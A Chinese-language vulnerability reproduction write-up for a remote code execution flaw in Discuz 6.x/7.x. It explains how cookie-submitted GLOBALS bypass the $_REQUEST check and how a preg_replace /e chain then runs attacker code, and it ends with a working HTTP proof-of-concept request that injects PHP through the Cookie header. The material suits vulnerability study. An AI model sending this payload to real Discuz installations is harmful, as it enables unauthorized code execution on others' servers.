---
title: Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞（wooyun-2010-080723）
date: 2010-05-26 16:19:00
categories: 
  - CVE
tags:
  - RCE
---

# Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞（wooyun-2010-080723）

## 前言

参考披露的报告复现

- 漏洞类型：RCE

- 影响版本：Discuz 6.x/7.x

## 漏洞复现

### 环境搭建

源码百度网盘下载位置：https://pan.baidu.com/s/1BC1L_QL3Gi0GXYQoR_Wqsg?pwd=2tjy

**PHP 推荐使用 5.3 版本**

PHPStudy 搭建好后访问 `/uc_server/install/` 安装 UCenter

![](https://pic1.imgdb.cn/item/6a185d8c105bdfb8115191cd.png)

安装完效果如下

![](https://pic1.imgdb.cn/item/6a185dd7105bdfb8115191d2.png)

访问 `/install/` 安装 Discuz 7.2

![](https://pic1.imgdb.cn/item/6a185df9105bdfb8115191d5.png)

安装成功界面

![](https://pic1.imgdb.cn/item/6a185e2f105bdfb8115191db.png)

### 漏洞代码

#### PHP 配置

PHP 5.3.x 版本中 `request_order` 默认值变为 `GP`（GET+POST）

```
request_order = "GP"  // 不再包含Cookie
```

#### 全局变量处理机制

`include/common.inc.php`

这段代码模拟 `register_globals` 功能，对用户输入进行过滤

检查变量名首字符是否为 `_`，防止覆盖内部变量

通过 `daddslashes()` 函数对输入进行转义处理

```php
foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
    foreach($$_request as $_key => $_value) {
        $_key{0} != '_' && $$_key = daddslashes($_value);
    }
}
```

绕过思路：这个机制只处理普通变量，不处理超全局数组如 `$GLOBALS`

开发者意识到 `GLOBALS` 变量的危险性，专门做了防御

但防御依赖 `$_REQUEST`，而 `$_REQUEST` 受 `request_order` 影响

```php
if (isset($_REQUEST['GLOBALS']) OR isset($_FILES['GLOBALS'])) {
    exit('Request tainting attempted.');
}
```

当 `request_order=GP` 时，`$_REQUEST` 不包含 `$_COOKIE`，因此通过 Cookie 提交 `GLOBALS` 可以绕过此检查

### 利用链

`include/discuzcode.func.php`

`preg_replace()` 函数在 `searcharray` 包含 `/e` 修饰符时，会将 `replacearray` 作为 PHP 代码执行

代码直接使用  `$GLOBALS['_DCACHE']['smilies']`，没有进行安全验证

攻击者可以通过控制这个全局变量来构造恶意的正则表达式替换

```php
function discuzcode($message, $smileyoff, $bbcodeoff, ...) {
    // ... 其他代码
    
    if(!$smileyoff && $allowsmilies && !empty($GLOBALS['_DCACHE']['smilies']) && is_array($GLOBALS['_DCACHE']['smilies'])) {
        // ... 处理表情替换
        
        $message = preg_replace(
            $GLOBALS['_DCACHE']['smilies']['searcharray'], 
            $GLOBALS['_DCACHE']['smilies']['replacearray'], 
            $message, 
            $maxsmilies
        );
    }
}
```

执行过程：

- 通过 Cookie 提交 `GLOBALS` 变量，绕过 `$_REQUEST` 检查

- 覆盖 `$GLOBALS['_DCACHE']['smilies']` 数组

- 当 `discuzcode()` 函数执行时，调用 `preg_replace()`

- 由于 `searcharray` 包含 `/e` 修饰符，`replacearray` 中的 `phpinfo()` 被当作 PHP 代码执行

```
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; 
       GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
```

```
/      - 正则表达式的开始和结束分隔符
.*     - 匹配任意字符（除换行符外）零次或多次
/e     - PHP 特有的修饰符
u      - UTF-8 模式修饰符
i      - 不区分大小写修饰符
```

## POC

```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
```